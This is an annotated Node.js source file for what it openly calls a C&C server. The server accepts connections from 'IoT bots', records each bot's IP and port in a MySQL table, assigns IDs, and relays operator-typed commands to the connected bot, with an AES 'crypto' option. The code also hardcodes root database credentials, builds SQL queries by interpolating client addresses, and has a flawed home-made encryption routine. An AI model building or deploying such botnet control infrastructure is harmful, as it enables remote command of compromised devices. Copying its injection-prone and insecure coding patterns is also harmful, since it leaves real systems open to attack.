//this is an annotated version of the code
const aesjs = require('aes-js');
const net = require ('net');

// readline is used to read and write on the comand line
const readline = require('node:readline');

// mysql2 is to deal with the database
const mysql = require ('mysql2');

const sqlcon = mysql.createConnection({
  host: "172.18.18.19",
  port: 3306,
  user:"root",
  password:"123456",
  database:"mydb"
});
// getting the last maximum id of IoTs in the table
let ID = null;
sqlcon.query('Select Max(ID) from IoT_Bots;', (err, result)=>{
  if (err) throw err;
  ID = result[0]['Max(ID)'];
  console.log(ID);
})
// the maximum size that is allowed for the message we have to know it and we have 
const MAX_MSG_SIZE = 2000;

// we create a tcp server
var server = net.createServer();
// the server is on the local loop listennig on the port 5000
server.listen({
    host: '172.18.18.18',
    port: 5000,
    encoding: 'utf8'
});

let socketconn;
// this function is to read what the client is forwarding
function readsokcet (socket) {
 // it is triggered whenvere the there is data sent through the socket
    socket.on('data', function(data) {
        const buf =  Buffer.alloc(256);
        const len = buf.write(data.toString());
    
        console.log(len + " The client send:" + buf.toString('utf8', 0, len));
    });
    };
// This function is to send msg to the client

function send_msg( conn, msg){

    if(msg.length > MAX_MSG_SIZE){
        console.log('Error: msg too big');
    
     } else if(msg.length < 10){
        try{
    // need to add a space after the msg.lenght
        conn.write(msg.length.toString()+ " " + msg); 
        console.log("[C&C] action: Sending message to IoT, status: 1.");
        }catch(e){
         console.log("Error: "+e);   }
     }else{
        try {
    // first two bytes sent is the lenght of the msg
         conn.write(msg.length.toString() + msg);
         console.log("[C&C] action: Sending message to IoT, status: 1.");
    
    }catch(e){
        console.log("Error:"+e);
         }
        }    
    };
   // the encryption-decription function
    function encrypt_encode(plain)
    {       
        var key = [0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c];
        var aes = new aesjs.AES(key);
        var chunk ;
        var ChunkAsBytes;
        var encryptedBytes;
        var Entiretext="";
        var zeros="";
            for( i = 0; i < plain.length; i+=16){
                chunk = plain.slice(i, i + 16);
                if (chunk.length < 16){
                    for(let i=0; i<(16-chunk.length) ; i++)
                         zeros=zeros.concat("0");
                    chunk=chunk.concat(zeros);
                    }
                ChunkAsBytes = aesjs.utils.utf8.toBytes(chunk);
                encryptedBytes = aes.encrypt(ChunkAsBytes);
                Entiretext = Entiretext.concat(encryptedBytes)
            }     
            return Buffer.from(Entiretext).toString('base64')
    
    }
// here we define an interface to the command line to read and write on it    
const RLine = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: 'C&C> '
});

console.log("whenver you want enter a command or a message to send it to the client.");
RLine.prompt();


let msg = 'The server will send you soon some command to execute them!!';
// conecting the server to the database.
sqlcon.connect((err)=>{
  if (err) throw err;

  console.log('[C&C] action: Connection to the database, status: 1.');

});


// this what the server will do whenever a client is connected to it 


server.on('connection', (conn)=>{
 

  socketconn = conn; 
  sqlcon.query(`select ID from IoT_Bots where IP ='${conn.remoteAddress}'`,(err, result) => {
    if (err) throw err;
    let command =null;
    // if it is an new ip add a record to the database
    if (result.length == 0) {
        ID++;
        console.log(`[C&C] action: Connection from ${ID}, status: 1`);
        sqlcon.query(`Insert into IoT_Bots (ID, IP, port, status) values (${ID},'${conn.remoteAddress}',${conn.remotePort},'Connected');`, (err, result)=>{
            if (err) throw err;
            console.log("[IoT_Bots] action: Adding Record, status:"+result.affectedRows);
          });
          command = `00 ${ID}`
          send_msg(conn, command);
    }else{// if it is an old update the record

     console.log(`[C&C] action: Connection from ${result[0]['ID']}, status: 1`);
      sqlcon.query(`UPDATE IoT_Bots set port = ${conn.remotePort} where IP = '${conn.remoteAddress}';`, (err, result)=>{
        if (err) throw err;
        console.log("[IoT_Bots] action: Update Record, status:"+result.affectedRows);
      });
      command = `00 ${result[0]['ID']}`
      send_msg(conn, command);
      
    }
  });
 

  readsokcet(conn);

  

});
function toHexString(byteArray) {
    return byteArray.reduce((output, elem) => 
      (output + ('0' + elem.toString(16)).slice(-2)),
      '');
  }
  function hex_to_ascii(str1)
  {
     var hex  = str1.toString();
     var str = '';
     for (var n = 0; n < hex.length; n += 2) {
         str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
     }
     return str.toString('base64');
  }
  // the handeler of the event of writing on the command line
RLine.on('line', (line) => {
  switch (line.trim()) {
    case 'hello':
      console.log('world!');
      send_msg(socketconn, line.trim());
      break;
    case 'crypto':
        var text = "GeecksforGeecks.";
        socketconn.write(encrypt_encode(text));
        break;
    default:
      send_msg(socketconn, line.trim());
      break;
  }
  RLine.prompt();
}).on('close', () => {
  console.log('Have a great day!');
  process.exit(0);
});
